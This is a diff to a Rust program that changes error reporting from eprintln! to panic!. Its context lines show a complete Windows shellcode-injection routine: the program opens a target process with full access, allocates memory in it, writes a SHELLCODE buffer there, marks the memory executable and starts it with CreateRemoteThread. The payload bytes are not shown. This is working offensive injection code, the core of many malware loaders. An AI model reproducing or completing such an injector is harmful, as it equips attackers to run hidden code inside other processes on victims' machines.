@@ -31,7 +31,7 @@ fn main() {
         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
         if handle == 0 {
-            eprintln!("OpenProcess failed!");
+            panic!("OpenProcess failed!");
         }
 
         let dest = VirtualAllocEx(
@@ -43,26 +43,26 @@ fn main() {
         );
 
         if dest.is_null() {
-            eprintln!("VirtualAllocEx failed!");
+            panic!("VirtualAllocEx failed!");
         }
 
         let res = WriteProcessMemory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());
 
         if res == FALSE {
-            eprintln!("WriteProcessMemory failed!");
+            panic!("WriteProcessMemory failed!");
         }
 
         let res = VirtualProtectEx(handle, dest, SIZE, PAGE_EXECUTE, &mut old);
 
         if res == FALSE {
-            eprintln!("VirtualProtectEx failed!");
+            panic!("VirtualProtectEx failed!");
         }
 
         let dest = transmute(dest);
         let thread = CreateRemoteThread(handle, null(), 0, dest, null(), 0, null_mut());
 
         if thread == 0 {
-            eprintln!("CreateRemoteThread failed!");
+            panic!("CreateRemoteThread failed!");
         }
 
         CloseHandle(handle);
